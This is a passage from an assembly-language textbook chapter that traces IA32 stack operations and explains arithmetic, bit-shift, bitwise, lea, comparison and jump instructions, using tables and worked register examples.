<p class="indent">Notice that the stack grows toward <em>lower</em> addresses. Registers <span class="literal">%eax</span> and <span class="literal">%edx</span> currently contain junk values. The addresses associated with the instructions in the code segment of program memory (0x804840b–0x8048415) have been shortened to 0x40b–0x415 to improve figure readability. Likewise, the addresses associated with the call stack segment of program memory have been shortened to 0x108–0x110 from 0xffffd108–0xffffd110. In truth, call stack addresses occur at higher addresses in program memory than code segment addresses.</p>&#13;
<p class="indent">Pay close attention to the initial (made up) values of registers <span class="literal">%esp</span> and <span class="literal">%ebp</span>: they are 0x10c and 0x12a, respectively. The call stack currently has the value 0x28 (or 40) at stack address 0x110 (why and how this got here will be covered in our discussion on “Functions in Assembly” on <a href="ch07.xhtml#lev1_55">page 326</a>). The upper-left arrow in the following figures visually indicates the currently executing instruction. The <span class="literal">%eip</span> register (or instruction pointer) shows the next instruction to execute. Initially, <span class="literal">%eip</span> contains address 0x40b, which corresponds to the first instruction in the <span class="literal">adder2</span> function.</p>&#13;
<div class="imagec"><span epub:type="pagebreak" id="page_387"/><img alt="image" src="../images/f0387-01.jpg"/></div>&#13;
<p class="indent">The first instruction (<span class="literal">push %ebp</span>) places a copy of the value in <span class="literal">%ebp</span> (or 0x12a) on top of the stack. After it executes, the <span class="literal">%eip</span> register advances to the address of the next instruction to execute (or 0x40c). The <span class="literal">push</span> instruction decrements the stack pointer by 4 (“growing” the stack by 4 bytes), resulting in a new <span class="literal">%esp</span> value of 0x108. Recall that the <span class="literal">push %ebp</span> instruction is equivalent to:</p>&#13;
<p class="programs">sub $4,%esp<br/>&#13;
mov %ebp,(%esp)</p>&#13;
<p class="noindent">In other words, subtract 4 from the stack pointer and place a copy of the contents of <span class="literal">%ebp</span> in the location pointed to by the dereferenced stack pointer, <span class="literal">(%esp)</span>.</p>&#13;
<div class="imagec"><span epub:type="pagebreak" id="page_388"/><img alt="image" src="../images/f0388-01.jpg"/></div>&#13;
<p class="indent">Recall that the structure of the <span class="literal">mov</span> instruction is <span class="literal">mov S,D</span>, where S is the source location, and D is the destination. Thus, the next instruction (<span class="literal">mov</span> <span class="literal">%esp,%ebp</span>) updates the value of <span class="literal">%ebp</span> to 0x108. The register <span class="literal">%eip</span> advances to the address of the next instruction to execute, or 0x40e.</p>&#13;
<div class="imagec"><img alt="image" src="../images/f0388-02.jpg"/></div>&#13;
<p class="indent">Next, <span class="literal">mov 0x8(%ebp),%eax</span> is executed. This is a bit more complicated than the last <span class="literal">mov</span> instruction. Let’s parse it by consulting the operand table from the previous section. First, <span class="literal">0x8(%ebp)</span> translates to M[<span class="literal">%ebp</span> + 0x8]. Since <span class="literal">%ebp</span> contains the value 0x108, adding 8 to it yields 0x110. Performing a (stack) memory lookup on 0x110 yields the value 0x28 (recall that 0x28 was placed on the stack by previous code). So, the value 0x28 is copied into register <span class="literal">%eax</span>. The instruction pointer advances to address 0x411, the next address to be executed.</p>&#13;
<div class="imagec"><span epub:type="pagebreak" id="page_389"/><img alt="image" src="../images/f0389-01.jpg"/></div>&#13;
<p class="indent">Afterward, <span class="literal">add $0x2,%eax</span> is executed. Recall that the <span class="literal">add</span> instruction has the form <span class="literal">add S,D</span> and places the quantity S + D in the destination D. So, <span class="literal">add</span> <span class="literal">$0x2,%eax</span> adds the constant value 0x2 to the value stored in <span class="literal">%eax</span> (or 0x28), resulting in 0x2A being stored in register <span class="literal">%eax</span>. Register <span class="literal">%eip</span> advances to point to the next instruction to be executed, or 0x414.</p>&#13;
<div class="imagec"><img alt="image" src="../images/f0389-02.jpg"/></div>&#13;
<p class="indent">The next instruction that executes is <span class="literal">pop %ebp</span>. This instruction “pops” a value off the call stack and places it in destination register <span class="literal">%ebp</span>. Recall that this instruction is equivalent to the following sequence of two instructions:</p>&#13;
<p class="programs">mov (%esp),%ebp<br/>&#13;
add $4,%esp</p>&#13;
<p class="indent">After this instruction executes, the value at the top of the stack <span class="literal">(%esp)</span> or M[0x108] is copied into register <span class="literal">%ebp</span>. Thus, <span class="literal">%ebp</span> now contains the value 0x12a. The stack pointer <em>increments</em> by 4, since the stack grows toward lower <span epub:type="pagebreak" id="page_390"/>addresses (and consequently, <em>shrinks</em> toward higher ones). The new value of <span class="literal">%esp</span> is 0x10c, and <span class="literal">%eip</span> now points to the address of the last instruction to execute in this code snippet (0x415).</p>&#13;
<p class="indent">The last instruction executed is <span class="literal">ret</span>. We will talk more about what happens with <span class="literal">ret</span> in future sections when we discuss function calls, but for now it suffices to know that it prepares the call stack for returning from a function. By convention, the register <span class="literal">%eax</span> always contains the return value (if one exists). In this case, the function returns the value 0x2A, which corresponds to the decimal value 42.</p>&#13;
<p class="indent">Before we continue, note that the final values in registers <span class="literal">%esp</span> and <span class="literal">%ebp</span> are 0x10c and 0x12a, respectively, which are the <em>same values as when the function started executing</em>! This is normal and expected behavior with the call stack. The purpose of the call stack is to store the temporary variables and data of each function as it executes in the context of a program. Once a function completes executing, the stack returns to the state it was in prior to the function call. As a result, you will commonly see the following two instructions at the beginning of a function.</p>&#13;
<p class="programs">push %ebp<br/>&#13;
mov %esp, %ebp</p>&#13;
<p class="noindent">and the following two instructions at the end of every function:</p>&#13;
<p class="programs">pop %ebp<br/>&#13;
ret</p>&#13;
<h3 class="h3" id="lev1_64">8.3 Arithmetic Instructions</h3>&#13;
<p class="noindent">The IA32 ISA implements several instructions that correspond to arithmetic operations performed by the ALU. <a href="ch08.xhtml#ch8tab6">Table 8-6</a> lists several arithmetic instructions that one may encounter when reading assembly.</p>&#13;
<p class="tabcap" id="ch8tab6"><strong>Table 8-6:</strong> Common Arithmetic Instructions</p>&#13;
<table class="line">&#13;
<colgroup>&#13;
<col style="width:20%"/>&#13;
<col style="width:80%"/>&#13;
</colgroup>&#13;
<tr class="borderb">&#13;
<td style="vertical-align: top"><p class="tab"><strong>Instruction</strong></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><strong>Translation</strong></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">add S, D</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">S + D → D</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">sub S, D</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">D – S → D</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">inc D</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">D + 1 → D</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">dec D</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">D – 1 → D</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">neg D</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">–D → D</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">imul S, D</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">S × D → D</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">idiv S</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">%eax</span> / S: quotient → <span class="literal">%eax</span>, remainder → <span class="literal">%edx</span></p></td>&#13;
</tr>&#13;
</table>&#13;
<p class="indent">The <span class="literal">add</span> and <span class="literal">sub</span> instructions correspond to addition and subtraction and take two operands each. The next three entries show the single-register instructions for the increment (<span class="literal">x++</span>), decrement (<span class="literal">x--</span>), and negation (<span class="literal">-x</span>) operations in C. The multiplication instruction operates on two operands and <span epub:type="pagebreak" id="page_391"/>places the product in the destination. If the product requires more than 32 bits to represent, the value will be truncated to 32 bits.</p>&#13;
<p class="indent">The division instruction works a little differently. Prior to the execution of the <span class="literal">idiv</span> instruction, it is assumed that register <span class="literal">%eax</span> contains the dividend. Calling <span class="literal">idiv</span> on operand S divides the contents of <span class="literal">%eax</span> by S and places the quotient in register <span class="literal">%eax</span>, and the remainder in register <span class="literal">%edx</span>.</p>&#13;
<h4 class="h4" id="lev2_145">8.3.1 Bit Shifting Instructions</h4>&#13;
<p class="noindent">Bit shifting instructions enable the compiler to perform bit shifting operations. Multiplication and division instructions typically take a long time to execute. Bit shifting offers the compiler a shortcut for multiplicands and divisors that are powers of 2. For example, to compute <span class="literal">77 * 4</span>, most compilers will translate this operation to <span class="literal">77 ≪ 2</span> to avoid the use of an <span class="literal">imul</span> instruction. Likewise, to compute <span class="literal">77 / 4</span>, a compiler typically translates this operation to <span class="literal">77 ≫ 2</span> to avoid using the <span class="literal">idiv</span> instruction.</p>&#13;
<p class="indent">Keep in mind that left and right bit shift translate to different instructions based on whether the goal is an arithmetic (signed) or logical (unsigned) shift.</p>&#13;
<p class="tabcap" id="ch8tab7"><strong>Table 8-7:</strong> Bit Shift Instructions</p>&#13;
<table class="line">&#13;
<colgroup>&#13;
<col style="width:20%"/>&#13;
<col style="width:30%"/>&#13;
<col style="width:50%"/>&#13;
</colgroup>&#13;
<tr class="borderb">&#13;
<td style="vertical-align: top"><p class="tab"><strong>Instruction</strong></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><strong>Translation</strong></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><strong>Arithmetic or logical?</strong></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">sal v, D</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">D <span class="literal">≪</span> v → D</p></td>&#13;
<td style="vertical-align: top"><p class="tab">arithmetic</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">shl v, D</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">D <span class="literal">≪</span> v → D</p></td>&#13;
<td style="vertical-align: top"><p class="tab">logical</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">sar v, D</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">D <span class="literal">≫</span> v → D</p></td>&#13;
<td style="vertical-align: top"><p class="tab">arithmetic</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">shr v, D</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">D <span class="literal">≫</span> v → D</p></td>&#13;
<td style="vertical-align: top"><p class="tab">logical</p></td>&#13;
</tr>&#13;
</table>&#13;
<p class="indent">Each shift instruction take two operands, one which is usually a register (denoted by D), and the other which is a shift value (<em>v</em>). On 32-bit systems, the shift value is encoded as a single byte (since it doesn’t make sense to shift past 31). The shift value <em>v</em> must either be a constant or stored in register <span class="literal">%cl</span>.</p>&#13;
<p class="note"><strong><span class="black">Note</span> DIFFERENT VERSIONS OF INSTRUCTIONS HELP DISTINGUISH TYPES AT AN ASSEMBLY LEVEL</strong></p>&#13;
<p class="note1">At the assembly level, there is no notion of types. However, recall that shift right works differently depending on whether or not the value is signed. At the assembly level, the compiler uses separate instructions to distinguish between logical and arithmetic shifts!</p>&#13;
<h4 class="h4" id="lev2_146">8.3.2 Bitwise Instructions</h4>&#13;
<p class="noindent">Bitwise instructions enable the compiler to perform bitwise operations on data. One way the compiler uses bitwise operations is for certain optimizations. For example, a compiler may choose to implement 77 mod 4 with the operation <span class="literal">77 &amp;</span> <span class="literal">3</span> in lieu of the more expensive <span class="literal">idiv</span> instruction.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_392"/><a href="ch08.xhtml#ch8tab8">Table 8-8</a> lists common bitwise instructions.</p>&#13;
<p class="tabcap" id="ch8tab8"><strong>Table 8-8:</strong> Bitwise Operations</p>&#13;
<table class="line">&#13;
<colgroup>&#13;
<col style="width:30%"/>&#13;
<col style="width:70%"/>&#13;
</colgroup>&#13;
<tr class="borderb">&#13;
<td style="vertical-align: top"><p class="tab"><strong>Instruction</strong></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><strong>Translation</strong></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">and S,D</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">S <span class="literal">&amp;</span> D → D</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">or S,D</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">S <span class="literal">|</span> D → D</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">xor S,D</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">S <span class="literal">^</span> D → D</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">not D</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">~</span>D → D</p></td>&#13;
</tr>&#13;
</table>&#13;
<p class="indent">Remember that bitwise <span class="literal">not</span> is distinct from negation (<span class="literal">neg</span>). The <span class="literal">not</span> instruction flips the bits, but does not add 1. Be careful not to confuse these two instructions.</p>&#13;
<p class="note"><strong><span class="black">Warning</span> USE BITWISE OPERATIONS ONLY WHEN NEEDED IN YOUR C CODE!</strong></p>&#13;
<p class="note-w">After reading this section, it may be tempting to replace common arithmetic operations in your C code with bitwise shifts and other operations. This is <em>not</em> recommended. Most modern compilers are smart enough to replace simple arithmetic operations with bitwise operations when it makes sense, making it unnecessary for the programmer to do so. As a general rule, programmers should prioritize code readability whenever possible and avoid premature optimization.</p>&#13;
<h4 class="h4" id="lev2_147">8.3.3 The Load Effective Address Instruction</h4>&#13;
<div class="flushright">&#13;
<p class="right"><em>What’s lea got to do (got to do) with it?</em></p>&#13;
<p class="right"><em>What’s lea, but an effective address loading?</em></p>&#13;
<p class="right">—With apologies to Tina Turner</p>&#13;
</div>&#13;
<p class="indenta">We finally come to the <em>load effective address</em> or <span class="literal">lea</span> instruction, which is probably the arithmetic instruction that causes students the most consternation. It is traditionally used as a fast way to compute the address of a location in memory. The <span class="literal">lea</span> instruction operates on the same operand structure that we’ve seen thus far but does <em>not</em> include a memory lookup. Regardless of the type of data contained in the operand (whether it be a constant value or an address), <span class="literal">lea</span> simply performs arithmetic.</p>&#13;
<p class="indent">For example, suppose that register <span class="literal">%eax</span> contains the constant value 0x5, register <span class="literal">%edx</span> contains the constant value 0x4, and register <span class="literal">%ecx</span> contains the value 0x808 (which happens to be an address). <a href="ch08.xhtml#ch8tab9">Table 8-9</a> gives some example <span class="literal">lea</span> operations, their translations, and corresponding values.</p>&#13;
<p class="tabcap" id="ch8tab9"><span epub:type="pagebreak" id="page_393"/><strong>Table 8-9:</strong> Example lea Operations</p>&#13;
<table class="line">&#13;
<colgroup>&#13;
<col style="width:30%"/>&#13;
<col style="width:30%"/>&#13;
<col style="width:40%"/>&#13;
</colgroup>&#13;
<tr class="borderb">&#13;
<td style="vertical-align: top"><p class="tab"><strong>Instruction</strong></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><strong>Translation</strong></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><strong>Value</strong></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">lea 8(%eax), %eax</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">8 + <span class="literal">%eax</span> → <span class="literal">%eax</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">13 → <span class="literal">%eax</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">lea (%eax, %edx), %eax</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">%eax</span> + <span class="literal">%edx</span> → <span class="literal">%eax</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">9 → <span class="literal">%eax</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">lea (,%eax,4), %eax</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">%eax</span> × 4 → <span class="literal">%eax</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">20 → <span class="literal">%eax</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">lea -0x8(%ecx), %eax</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">%ecx</span> – <span class="literal">8</span> → <span class="literal">%eax</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">0x800 → <span class="literal">%eax</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">lea -0x4(%ecx, %edx, 2), %eax</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">%ecx</span> + <span class="literal">%edx</span> × 2 – 4 → <span class="literal">%eax</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">0x80c → <span class="literal">%eax</span></p></td>&#13;
</tr>&#13;
</table>&#13;
<p class="indent">In all cases, the <span class="literal">lea</span> instruction performs arithmetic on the operand specified by the source S and places the result in the destination operand D. The <span class="literal">mov</span> instruction is identical to the <span class="literal">lea</span> instruction <em>except</em> that the <span class="literal">mov</span> instruction is <em>required</em> to treat the contents in the source operand as a memory location if it is in a memory form. In contrast, <span class="literal">lea</span> performs the same (sometimes complicated) operand arithmetic <em>without</em> the memory lookup, enabling the compiler to cleverly use <span class="literal">lea</span> as a substitution for some types of arithmetic.</p>&#13;
<h3 class="h3" id="lev1_65">8.4 Conditional Control and Loops</h3>&#13;
<p class="noindent">This section covers assembly instructions for conditionals and loops (see “Conditionals and Loops” on <a href="ch01.xhtml#lev1_3">page 30</a>). Recall that conditional statements enable coders to modify program execution based on the result of a conditional expression. The compiler translates conditionals into assembly instructions that modify the instruction pointer (<span class="literal">%eip</span>) to point to an address that is not the next one in the program sequence.</p>&#13;
<h4 class="h4" id="lev2_148">8.4.1 Preliminaries</h4>&#13;
<h5 class="h5" id="lev3_63">Conditional Comparison Instructions</h5>&#13;
<p class="noindent">Comparison instructions perform an arithmetic operation for the purpose of guiding the conditional execution of a program. <a href="ch08.xhtml#ch8tab10">Table 8-10</a> lists the basic instructions associated with conditional control.</p>&#13;
<p class="tabcap" id="ch8tab10"><strong>Table 8-10:</strong> Conditional Control Instructions</p>&#13;
<table class="line">&#13;
<colgroup>&#13;
<col style="width:30%"/>&#13;
<col style="width:70%"/>&#13;
</colgroup>&#13;
<tr class="borderb">&#13;
<td style="vertical-align: top"><p class="tab"><strong>Instruction</strong></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><strong>Translation</strong></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">cmp R1, R2</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">Compares R2 with R1 (i.e., evaluates R2 – R1)</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">test R1, R2</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">Computes R1 &amp; R2</p></td>&#13;
</tr>&#13;
</table>&#13;
<p class="indent">The <span class="literal">cmp</span> instruction compares the values of two registers, R2 and R1. Specifically, it subtracts R1 from R2. The <span class="literal">test</span> instruction performs bitwise AND. It is common to see an instruction like:</p>&#13;
<p class="programs">test %eax, %eax</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_394"/>In this example, the bitwise AND of <span class="literal">%eax</span> with itself is zero only when <span class="literal">%eax</span> contains zero. In other words, this is a test for a zero value and is equivalent to the following:</p>&#13;
<p class="programs">cmp $0, %eax</p>&#13;
<p class="indent">Unlike the arithmetic instructions covered thus far, <span class="literal">cmp</span> and <span class="literal">test</span> do not modify the destination register. Instead, both instructions modify a series of single-bit values known as <em>condition code flags</em>. For example, <span class="literal">cmp</span> will modify condition code flags based on whether the value R2 – R1 results in a positive (greater), negative (less), or zero (equal) value. Recall that condition code values encode information about an operation in the ALU (see “The ALU” on <a href="ch05.xhtml#lev2_100">page 261</a>). The condition code flags are part of the <span class="literal">FLAGS</span> register on x86 systems.</p>&#13;
<p class="tabcap" id="ch8tab11"><strong>Table 8-11:</strong> Common Condition Code Flags</p>&#13;
<table class="line">&#13;
<colgroup>&#13;
<col style="width:20%"/>&#13;
<col style="width:80%"/>&#13;
</colgroup>&#13;
<tr class="borderb">&#13;
<td style="vertical-align: top"><p class="tab"><strong>Flag</strong></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><strong>Translation</strong></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">ZF</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">Is equal to zero (1: yes; 0: no)</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">SF</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">Is negative (1: yes; 0: no)</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">OF</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">Overflow has occurred (1: yes; 0: no)</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">CF</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">Arithmetic carry has occurred (1: yes; 0: no)</p></td>&#13;
</tr>&#13;
</table>&#13;
<p class="indent"><a href="ch08.xhtml#ch8tab11">Table 8-11</a> depicts the common flags used for condition code operations. Revisiting the <span class="literal">cmp R1, R2</span> instruction:</p>&#13;
<ul>&#13;
<li class="noindent">The <span class="literal">ZF</span> flag is set to 1 if R1 and R2 are equal.</li>&#13;
<li class="noindent">The <span class="literal">SF</span> flag is set to 1 if R2 is <em>less</em> than <span class="literal">R1</span> (R2 – R1 results in a negative value).</li>&#13;
<li class="noindent">The <span class="literal">OF</span> flag is set to 1 if the operation R2 – R1 results in an integer overflow (useful for signed comparisons).</li>&#13;
<li class="noindent">The <span class="literal">CF</span> flag is set to 1 if the operation R2 – R1 results in a carry operation (useful for unsigned comparisons).</li>&#13;
</ul>&#13;
<p class="indent">The <span class="literal">SF</span> and <span class="literal">OF</span> flags are used for comparison operations on signed integers, whereas the <span class="literal">CF</span> flag is used for comparisons on unsigned integers. Although an in-depth discussion of condition code flags is beyond the scope of this book, the setting of these registers by <span class="literal">cmp</span> and <span class="literal">test</span> enables the next set of instructions we cover (the <em>jump</em> instructions) to operate correctly.</p>&#13;
<h5 class="h5" id="lev3_64">Jump Instructions</h5>&#13;
<p class="noindent">A jump instruction enables a program’s execution to “jump” to a new position in the code. In the assembly programs we have traced through thus far, <span class="literal">%eip</span> always points to the next instruction in program memory. The jump instructions enable <span class="literal">%eip</span> to be set to either a new instruction not yet seen (as in the case of an <span class="literal">if</span> statement) or to a previously executed instruction (as in the case of a loop).</p>&#13;
<p class="tabcap" id="ch8tab12"><span epub:type="pagebreak" id="page_395"/><strong>Table 8-12:</strong> Direct Jump Instructions</p>&#13;
<table class="line">&#13;
<colgroup>&#13;
<col style="width:20%"/>&#13;
<col style="width:80%"/>&#13;
</colgroup>&#13;
<tr class="borderb">&#13;
<td style="vertical-align: top"><p class="tab"><strong>Instruction</strong></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><strong>Description</strong></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">jmp L</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">Jump to location specified by L</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">jmp *addr</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">Jump to specified address</p></td>&#13;
</tr>&#13;
</table>&#13;
<p class="noindentt"><strong>Direct jump instructions.</strong>   <a href="ch08.xhtml#ch8tab12">Table 8-12</a> lists the set of direct jump instructions; <span class="literal">L</span> refers to a <em>symbolic label</em>, which serves as an identifier in the program’s object file. All labels consist of some letters and digits followed by a colon. Labels can be <em>local</em> or <em>global</em> to an object file’s scope. Function labels tend to be <em>global</em> and usually consist of the function name and a colon. For example, <span class="literal">main:</span> (or <span class="literal">&lt;main&gt;:</span>) is used to label a user-defined <span class="literal">main</span> function. In contrast, labels whose scope are <em>local</em> are preceded by a period. For example, <span class="literal">.L1:</span> is a local label one may encounter in the context of an <span class="literal">if</span> statement or loop.</p>&#13;
<p class="indent">All labels have an associated address. When the CPU executes a <span class="literal">jmp</span> instruction, it modifies <span class="literal">%eip</span> to reflect the program address specified by label <span class="literal">L</span>. A programmer writing assembly can also specify a particular address to jump to using the <span class="literal">jmp *</span> instruction. Sometimes, local labels are shown as an offset from the start of a function. Therefore, an instruction whose address is 28 bytes away from the start of <span class="literal">main</span> may be represented with the label <span class="literal">&lt;main+28&gt;</span>.</p>&#13;
<p class="indent">For example, the instruction <span class="literal">jmp 0x8048427 &lt;main+28&gt;</span> indicates a jump to address 0x8048427, which has the associated label <span class="literal">&lt;main+28&gt;</span>, representing that it is 28 bytes away from the starting address of the <span class="literal">main</span> function. Executing this instruction sets <span class="literal">%eip</span> to 0x8048427.</p>&#13;
<p class="noindentt"><strong>Conditional jump instructions.</strong>   The behavior of conditional jump instructions depends on the condition code registers set by the <span class="literal">cmp</span> instruction. <a href="ch08.xhtml#ch8tab13">Table 8-13</a> lists the set of common conditional jump instructions. Each instruction starts with the letter <span class="literal">j</span> denoting that it is a jump instruction. The suffix of each instruction indicates the <em>condition</em> for the jump. The jump instruction suffixes also determine whether to interpret numerical comparisons as signed or unsigned.</p>&#13;
<p class="tabcap" id="ch8tab13"><strong>Table 8-13:</strong> Conditional Jump Instructions; Synonyms Shown in Parentheses</p>&#13;
<table class="line">&#13;
<colgroup>&#13;
<col style="width:20%"/>&#13;
<col style="width:20%"/>&#13;
<col style="width:60%"/>&#13;
</colgroup>&#13;
<tr class="borderb">&#13;
<td style="vertical-align: top"><p class="tab"><strong>Signed Comparison</strong></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><strong>Unsigned Comparison</strong></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><strong>Description</strong></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">je</span> (<span class="literal">jz</span>)</p></td>&#13;
<td style="vertical-align: top"><p class="tab"/></td>&#13;
<td style="vertical-align: top"><p class="tab">jump if equal (==) or jump if zero</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">jne</span> (<span class="literal">jnz</span>)</p></td>&#13;
<td style="vertical-align: top"><p class="tab"/></td>&#13;
<td style="vertical-align: top"><p class="tab">jump if not equal (!=)</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">js</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"/></td>&#13;
<td style="vertical-align: top"><p class="tab">jump if negative</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">jns</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"/></td>&#13;
<td style="vertical-align: top"><p class="tab">jump if non-negative</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">jg</span> (<span class="literal">jnle</span>)</p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">ja</span> (<span class="literal">jnbe</span>)</p></td>&#13;
<td style="vertical-align: top"><p class="tab">jump if greater (&gt;)</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">jge</span> (<span class="literal">jnl</span>)</p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">jae</span> (<span class="literal">jnb</span>)</p></td>&#13;
<td style="vertical-align: top"><p class="tab">jump if greater than or equal (&gt;=)</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">jl</span> (<span class="literal">jnge</span>)</p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">jb</span> (<span class="literal">jnae</span>)</p></td>&#13;
<td style="vertical-align: top"><p class="tab">jump if less (&lt;)</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">jle</span> (<span class="literal">jng</span>)</p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">jbe</span> (<span class="literal">jna</span>)</p></td>&#13;
<td style="vertical-align: top"><p class="tab">jump if less than or equal (&lt;=)</p></td>&#13;
</tr>&#13;
</table>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_396"/>Instead of memorizing these different conditional jump instructions, it is more helpful to sound out the instruction suffixes. <a href="ch08.xhtml#ch8tab14">Table 8-14</a> lists the letters commonly found in jump instructions and their word correspondence.</p>&#13;
<p class="tabcap" id="ch8tab14"><strong>Table 8-14:</strong> Jump Instruction Suffixes</p>&#13;
<table class="line">&#13;
<colgroup>&#13;
<col style="width:20%"/>&#13;
<col style="width:80%"/>&#13;
</colgroup>&#13;
<tr class="borderb">&#13;
<td style="vertical-align: top"><p class="tab"><strong>Letter</strong></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><strong>Word</strong></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">j</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">jump</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">n</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">not</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">e</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">equal</p></td>&#13;
</tr>&#13;
